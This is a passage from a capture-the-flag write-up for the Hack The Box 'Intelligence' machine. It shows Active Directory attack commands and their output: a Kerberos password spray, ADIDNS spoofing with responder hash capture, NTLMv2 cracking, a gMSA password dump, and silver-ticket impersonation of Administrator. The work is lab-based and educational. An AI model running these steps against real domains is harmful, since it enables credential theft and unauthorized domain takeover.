</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       David.Mcbride@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Ian.Duncan@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Darryl.Harris@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Anita.Roberts@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       David.Wilson@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       David.Reed@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Brian.Baker@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Danny.Matthews@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Jason.Patterson@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       John.Coleman@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Jessica.Moody@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Jennifer.Thomas@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Jason.Wright@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Jose.Williams@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Nicole.Brock@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Richard.Williams@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Kelly.Long@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Thomas.Hall@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Stephanie.Young@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Scott.Scott@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Samuel.Richardson@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Teresa.Williamson@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Travis.Evans@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Tiffany.Molina@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       William.Lee@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Veronica.Patel@intelligence.htb
</span></span><span style="display:flex"><span>&gt;  Done! Tested <span style="color:#ae81ff">30</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">30</span> valid<span style="color:#f92672">)</span> in 0.355 seconds
</span></span></code></pre></div><p>And they are valid. We can check now if any of them is &ldquo;AS-REP Roastable&rdquo; but none of them is. We have reached another dead end.</p><h2 id="obtaining-valid-user-credentials">Obtaining valid user credentials</h2><p>Now, we can check the contents of all the PDF files. Maybe there is one that does not contain a <em>Lorem ipsum</em>.</p><p>And indeed, the file called <code>2020-06-04.pdf</code> contains the following information:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex"><span>New Account Guide
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Welcome to Intelligence Corp!
</span></span><span style="display:flex"><span>Please login using your username and the default password of:
</span></span><span style="display:flex"><span>NewIntelligenceCorpUser9876
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>After logging in please change your password as soon as possible. 
</span></span></code></pre></div><p>And also the file <code>2020-12-30.pdf</code> is readable:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex"><span>Internal IT Update
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>There has recently been some outages on our web servers. Ted has gotten a
</span></span><span style="display:flex"><span>script in place to help notify us if this happens again.
</span></span><span style="display:flex"><span>Also, after discussion following our recent security audit we are in the process 
</span></span><span style="display:flex"><span>of locking down our service accounts.
</span></span></code></pre></div><p>The first one tells that every new user is granted the same password in order to login the first time and change the password. Nevertheless, it is probable that someone has forgot to actually change the password.</p><p>This is a clear situation to perform a password spray attack. Using again <a href="https://github.com/ropnop/kerbrute"><code>kerbrute</code></a> we get:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ ./kerbrute passwordspray --dc dc.intelligence.htb -d intelligence.htb users.txt NewIntelligenceCorpUser9876
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>&gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
</span></span><span style="display:flex"><span>&gt;   dc.intelligence.htb:88
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>&gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID LOGIN WITH ERROR:       Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876     <span style="color:#f92672">(</span>Clock skew is too great<span style="color:#f92672">)</span> 
</span></span><span style="display:flex"><span>&gt;  Done! Tested <span style="color:#ae81ff">30</span> logins <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> successes<span style="color:#f92672">)</span> in 0.710 seconds
</span></span></code></pre></div><p>And the user called <code>Tiffany.Molina</code> has the default password set yet. With <a href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a> we are able to see if the credentials are valid:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
</span></span></code></pre></div><h2 id="enumerating-smb-shares">Enumerating SMB shares</h2><p>Now, we can enumerate SMB shares using the credentials found:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [+] Enumerated shares
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               Share           Permissions     Remark
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               -----           -----------     ------
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               C$                              Default share
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               IT              READ
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               Users           READ
</span></span></code></pre></div><p>User <code>Tiffany.Molina</code> has permissions to read interesting shares called <code>IT</code> and <code>Users</code>. Inside <code>Users</code> we can find the following folders:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r Users 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: Authenticated
</span></span><span style="display:flex"><span>        Disk                                                    Permissions     Comment
</span></span><span style="display:flex"><span>        ----                                                    -----------     -------
</span></span><span style="display:flex"><span>        Users                                                   READ ONLY
</span></span><span style="display:flex"><span>        .\Users\\*
</span></span><span style="display:flex"><span>        dw--w--w--                0 Mon Apr 19 03:20:26 2021    .
</span></span><span style="display:flex"><span>        dw--w--w--                0 Mon Apr 19 03:20:26 2021    ..
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 02:18:39 2021    Administrator
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 05:16:30 2021    All Users
</span></span><span style="display:flex"><span>        dw--w--w--                0 Mon Apr 19 04:17:40 2021    Default
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 05:16:30 2021    Default User
</span></span><span style="display:flex"><span>        fr--r--r--              174 Mon Apr 19 05:15:17 2021    desktop.ini
</span></span><span style="display:flex"><span>        dw--w--w--                0 Mon Apr 19 02:18:39 2021    Public
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 03:20:26 2021    Ted.Graves
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Tiffany.Molina
</span></span></code></pre></div><p>And here we can get the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download <span style="color:#e6db74">&#39;Users\Tiffany.Molina\Desktop\user.txt&#39;</span> 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Starting download: Users\Tiffany.Molina\Desktop\user.txt (34 bytes)
</span></span><span style="display:flex"><span>[+] File output to: 10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>$ mv *user.txt user.txt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ cat user.txt
</span></span><span style="display:flex"><span>d97eb9e4c5535fa637062d14b4b5e8c1 
</span></span></code></pre></div><h2 id="lateral-movement">Lateral movement</h2><p>Looking at the <code>IT</code> share, we can see a Powershell script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r IT
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: Authenticated
</span></span><span style="display:flex"><span>        Disk                                                    Permissions     Comment
</span></span><span style="display:flex"><span>        ----                                                    -----------     -------
</span></span><span style="display:flex"><span>        IT                                                      READ ONLY
</span></span><span style="display:flex"><span>        .\IT\\*
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 02:50:58 2021    .
</span></span><span style="display:flex"><span>        dr--r--r--                0 Mon Apr 19 02:50:58 2021    ..
</span></span><span style="display:flex"><span>        fr--r--r--             1046 Mon Apr 19 02:50:58 2021    downdetector.ps1
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download <span style="color:#e6db74">&#39;IT\downdetector.ps1&#39;</span> 
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Starting download: IT\downdetector.ps1 (1046 bytes)
</span></span><span style="display:flex"><span>[+] File output to: /Users/rocky/RockyHack/HackTheBox/Machines/Intelligence/content/smb/10.10.10.248-IT_downdetector.ps1
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>$ mv *.ps1 downdetector.ps1
</span></span></code></pre></div><p>The Powershell script is shown below:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-powershell" data-lang="powershell"><span style="display:flex"><span><span style="color:#75715e"># Check web server status. Scheduled to run every 5 min</span>
</span></span><span style="display:flex"><span>Import-Module ActiveDirectory
</span></span><span style="display:flex"><span><span style="color:#66d9ef">foreach</span> ($record <span style="color:#66d9ef">in</span> Get-ChildItem <span style="color:#e6db74">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> | Where-Object Name <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;web*&#34;</span>) {
</span></span><span style="display:flex"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex"><span>    $request = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://</span>$($record.Name)<span style="color:#e6db74">&#34;</span> -UseDefaultCredentials
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> (.StatusCode <span style="color:#f92672">-ne</span> 200) {
</span></span><span style="display:flex"><span>      Send-MailMessage -From <span style="color:#e6db74">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> -To <span style="color:#e6db74">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> -Subject <span style="color:#e6db74">&#34;Host: </span>$($record.Name)<span style="color:#e6db74"> is down&#34;</span> 
</span></span><span style="display:flex"><span>    }
</span></span><span style="display:flex"><span>  } <span style="color:#66d9ef">catch</span> { }
</span></span><span style="display:flex"><span>}
</span></span></code></pre></div><p>Basically, what it is doing is checking inside LDAP for subdomains like <code>web*.intelligence.htb</code> and making a request using the credentials of <code>Ted.Graves</code> (every 5 minutes). Recall that one PDF file was talking this script.</p><p>This time, we can add a subdomain called <code>webrocky.intelligence.htb</code> to the DNS using <code>Tiffany.Molina</code>&rsquo;s credentials that points to our attacker IP address (also known as ADIDNS <em>Spoofing</em>, more information <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing">here</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ python3 dnstool.py -u <span style="color:#e6db74">&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248 
</span></span><span style="display:flex"><span>[-] Connecting to host...
</span></span><span style="display:flex"><span>[-] Binding to host
</span></span><span style="display:flex"><span>[+] Bind OK
</span></span><span style="display:flex"><span>[-] Adding new record
</span></span><span style="display:flex"><span>[+] LDAP operation completed successfully
</span></span></code></pre></div><p>Then we can poison the network with <code>responder</code> to obtain the NTLMv2 hash of <code>Ted.Graves</code> (after waiting around 5 minutes):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span># responder -I tun0 -wrf
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[HTTP] NTLMv2 Client   : 10.10.10.248
</span></span><span style="display:flex"><span>[HTTP] NTLMv2 Username : intelligence\Ted.Graves
</span></span><span style="display:flex"><span>[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:babffe540ac1b831:0364CAF23EA2F62B341D14C3F4549FFE:0101000000000000B781A55282DBD701F1D34C24313F979000000000020008004C004E004B00390001001E00570049004E002D00470059005A0039005700450041003800580054004600040014004C004E004B0039002E004C004F00430041004C0003003400570049004E002D00470059005A00390057004500410038005800540046002E004C004E004B0039002E004C004F00430041004C00050014004C004E004B0039002E004C004F00430041004C0008003000300000000000000000000000002000004ED462F79CC6312548361C6AE96725DCCB9550B7169C99A9C3663CDF8F50C6F80A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D0072006F0063006B0079002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
</span></span></code></pre></div><p>Now that we have a hash, let&rsquo;s try to crack it with <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ john --wordlist<span style="color:#f92672">=</span>$WORDLISTS/rockyou.txt hash
</span></span><span style="display:flex"><span>Using default input encoding: UTF-8
</span></span><span style="display:flex"><span>Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
</span></span><span style="display:flex"><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span><span style="display:flex"><span>Mr.Teddy         (Ted.Graves)
</span></span><span style="display:flex"><span>1g 0:00:00:18 DONE 0.05288g/s 571891p/s 571891c/s 571891C/s Mr5M1rtins..Mr BOB
</span></span><span style="display:flex"><span>Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably 
</span></span><span style="display:flex"><span>Session completed.
</span></span></code></pre></div><p>And we found the password. Let&rsquo;s see if the credentials are valid using <a href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
</span></span><span style="display:flex"><span>SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
</span></span></code></pre></div><h2 id="performing-a-silver-ticket-attack">Performing a Silver Ticket attack</h2><p>Here we have another dead end. To continue we must enumerate the Active Directory environment using <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>.</p><p>For that purpose, first we need to generate some JSON files with all the information (domains, computers, users and groups) using <a href="https://github.com/fox-it/BloodHound.py"><code>bloodhound-python</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ bloodhound-python -c all -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --dns-timeout <span style="color:#ae81ff">60</span> -w <span style="color:#ae81ff">1</span> 
</span></span><span style="display:flex"><span>INFO: Found AD domain: intelligence.htb
</span></span><span style="display:flex"><span>INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span style="display:flex"><span>INFO: Found 1 domains
</span></span><span style="display:flex"><span>INFO: Found 1 domains in the forest
</span></span><span style="display:flex"><span>INFO: Found 2 computers
</span></span><span style="display:flex"><span>INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span style="display:flex"><span>INFO: Found 42 users
</span></span><span style="display:flex"><span>INFO: Found 54 groups
</span></span><span style="display:flex"><span>INFO: Found 0 trusts
</span></span><span style="display:flex"><span>INFO: Starting computer enumeration with 1 workers
</span></span><span style="display:flex"><span>INFO: Querying computer: svc_int.intelligence.htb
</span></span><span style="display:flex"><span>WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 61.44789505004883 seconds
</span></span><span style="display:flex"><span>INFO: Querying computer: dc.intelligence.htb
</span></span><span style="display:flex"><span>INFO: Done in 01M 29S
</span></span></code></pre></div><p>Then we can load these files into <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> and search for information to get access to the Domain Controller (DC). We have the following graph:</p><p><img src="/images/HTB/Intelligence/Intelligence-bloodhound.png" alt="BloodHound"></p><p>As it is shown above, <code>Ted.Graves</code> belongs to <code>ITSupport</code> group. And the members of this group have the privilege to get the password of <code>svc_int$</code>, which is a group managed service account (gMSA).</p><p>Using <a href="https://github.com/micahvandeusen/gMSADumper"><code>gMSADumper</code></a>, we can obtain the NTLM hash of this service account:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb 
</span></span><span style="display:flex"><span>Users or groups who can read password for svc_int$:
</span></span><span style="display:flex"><span> &gt; DC$
</span></span><span style="display:flex"><span> &gt; itsupport
</span></span><span style="display:flex"><span>svc_int$:::b98d4cef68f72a98dfeed732d1b1abca
</span></span></code></pre></div><p>Now that we have the NTLM hash of <code>svc_int$</code>, it&rsquo;s time to perform a Silver Ticket attack.</p><p>As in every Kerberos attack, first we must synchronize with the server (using <code>ntpdate</code> or <code>rdate</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span># ntpdate 10.10.10.248
</span></span><span style="display:flex"><span>ntpdate[25547]: step time server 10.10.10.248 offset +29732.296110 sec 
</span></span></code></pre></div><p>And now we can obtain a Silver Ticket to impersonate <code>Administrator</code> using Impacket&rsquo;s <code>getST.py</code> specifying the hash of <code>svc_int$</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :b98d4cef68f72a98dfeed732d1b1abca intelligence.htb/svc_int$ 
</span></span><span style="display:flex"><span>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Getting TGT for user
</span></span><span style="display:flex"><span>[*] Impersonating Administrator
</span></span><span style="display:flex"><span>[*]     Requesting S4U2self
</span></span><span style="display:flex"><span>[*]     Requesting S4U2Proxy
</span></span><span style="display:flex"><span>[*] Saving ticket in Administrator.ccache
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>$ export KRB5CCNAME<span style="color:#f92672">=</span>Administrator.ccache
</span></span></code></pre></div><p>After setting the ticket in <code>KRB5CCNAME</code> environment variable, we can use almost any Impacket tool to gain access to the server using the <code>-k -no-pass</code> flags (for example: <code>smbclient.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code> or <code>psexec.py</code>).</p><p>Using <code>wmiexec.py</code> we can access as <code>Administrator</code> and capture the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ wmiexec.py -k -no-pass -dc-ip 10.10.10.248 intelligence.htb/Administrator@dc.intelligence.htb 
</span></span><span style="display:flex"><span>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>[*] SMBv3.0 dialect used
</span></span><span style="display:flex"><span>[!] Launching semi-interactive shell - Careful what you execute
</span></span><span style="display:flex"><span>[!] Press help for extra shell commands
</span></span><span style="display:flex"><span>C:\&gt;whoami
</span></span><span style="display:flex"><span>intelligence\administrator
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>C:\&gt;type C:\Users\Administrator\Desktop\root.txt
</span></span><span style="display:flex"><span>f8f11214c3520eedde9fa839193356bc
</span></span></code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b mb1">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#finding-usernames-in-file-metadata">Finding usernames in file metadata</a></li><li><a href="#finding-more-files-and-usernames">Finding more files and usernames</a></li><li><a href="#obtaining-valid-user-credentials">Obtaining valid user credentials</a></li><li><a href="#enumerating-smb-shares">Enumerating SMB shares</a></li><li><a href="#lateral-movement">Lateral movement</a></li><li><a href="#performing-a-silver-ticket-attack">Performing a Silver Ticket attack</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺&nbsp;<span class="bmc-btn-text" style="font-family:cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" 